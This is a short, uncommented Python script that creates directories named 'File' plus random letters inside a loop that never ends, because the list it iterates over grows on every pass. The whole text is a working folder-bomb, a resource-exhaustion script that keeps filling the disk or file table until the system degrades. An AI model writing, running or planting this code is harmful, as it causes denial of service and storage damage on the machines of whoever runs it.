import os, string, random

counter = [1]

for i in counter:
    counter.append(i + 1)
    file_name = ''.join(random.choice(string.ascii_letters) for i in range(10))
    os.mkdir(f"File {file_name}")
